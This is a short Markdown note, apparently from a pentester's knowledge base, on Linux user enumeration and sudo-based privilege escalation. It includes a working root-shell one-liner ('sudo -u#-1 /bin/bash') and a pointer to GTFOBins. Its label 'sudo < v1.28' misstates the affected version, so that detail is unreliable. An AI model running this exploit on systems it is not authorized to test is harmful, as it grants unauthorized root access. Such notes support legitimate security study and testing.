---
id: User Enumeration
aliases: []
tags:
  - Linux/Privesc/User-Enumeration
links: "[[Privesc]]"
---

# User Enumeration

<!-- User & Group {{{-->
## User & Group

Enumerate current user and group

### User

#### whoami

The `whoami` command displays the currently logged in user on the system by
examining the `/etc/passwd` file.

- [Wikipedia - whoami](https://en.wikipedia.org/wiki/Whoami)
- [IBM - whoami command](https://www.ibm.com/docs/ssw_aix_72/w_commands/whoami.html)

Check the currently logged in user on the system

```sh
whoami
```

#### Home directory

Investigate the user's home directory

```sh
/home/{username}/
```

### Group

#### id

Display the system identifications of a specified user.

- [Cyberciti - Linux/Unix id Command Examples](https://www.cyberciti.biz/faq/unix-linux-id-command-examples-usage-syntax/)
- [IBM - id Command](https://www.ibm.com/docs/en/aix/7.3.0?topic=i-id-command)

Find a user’s UID (user ID) or GID (group ID) and other information

```sh
# Synopsis
id [Username] id [options]

# Current user
id

# Spicify a user
id -u {user}
```

### root

Investigate the `/root` directory

```sh
/root
```
<!-- }}} -->

<!-- Sudo {{{-->
## Sudo

<!-- Sudo version {{{-->
### Sudo version

Check `sudo` version

```sh
sudo --version
```

```sh
sudo -V
```
<!-- }}} -->

<!-- Sudo vulnerabilities {{{-->
### Sudo vulnerabilities

Check if `sudo` version is in a vulnerable range

```sh
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

Search `sudo` version for public exploits

```sh
searchsploit sudo
```

`sudo` < v1.28

```sh
sudo -u#-1 /bin/bash
```
<!-- }}} -->

<!-- Sudo commands {{{-->
### Sudo commands

Check which commands the current user may run

```sh
sudo -l
```

Run command as `user`

```sh
sudo -u user /bin/echo Hello World!
```

The found command(s) may be exploited with [GTFOBins](https://gtfobins.github.io/)
<!-- }}} -->

<!-- }}} -->
